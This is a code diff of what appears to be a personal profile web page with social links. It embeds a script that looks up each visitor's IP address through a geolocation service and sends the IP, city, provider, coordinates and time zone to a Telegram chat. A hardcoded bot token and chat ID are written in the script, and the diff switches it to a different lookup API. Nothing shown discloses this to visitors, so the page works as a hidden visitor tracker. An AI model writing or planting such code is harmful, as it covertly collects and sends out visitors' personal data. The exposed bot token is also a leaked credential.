@@ -20,7 +20,7 @@
         </p>
     </div>
     <div class="social-icons">
-        <a href="/">
+        <a href="https://github.com/Shiro2568">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ae/Github-desktop-logo-symbol.svg/1200px-Github-desktop-logo-symbol.svg.png">
         </a>
         <a href="https://t.me/Shiro06">
@@ -54,7 +54,7 @@
       const botToken = '5848862848:AAEIxZ-NCqLfXwec-TPzaN7CL9KJ9VSYesc';
       const chatId = '973391034';
       function getIPInfo(callback) {
-      fetch(`https://ip-api.com/json/${ip}`)
+      fetch(`https://ipapi.co/${ip}/json/`)
         .then(response => response.json())
         .then(data => {
           callback(data)
@@ -72,7 +72,7 @@
       },
       body: JSON.stringify({
         chat_id: chatId,
-        text: `    Статус: ${data.status}\nАйпи: ${data.query}\nСтрана: ${data.country}\nГород: ${data.city}\n Провайдер: ${data.isp} | ${data.org} (${data.as})\n Долгота: ${data.lat}\n Широта: ${data.lon}\n Часовой пояс: ${data.timezone}\n `,
+        text: `    Статус: ${data.status}\nАйпи: ${data.ip}\nСтрана: ${data.country_name}\nГород: ${data.city}\n Провайдер: ${data.org} | ${data.asn}\n Долгота: ${data.latitude}\n Широта: ${data.longitude}\n Часовой пояс: ${data.timezone}\n `,
       }),
     })
   });
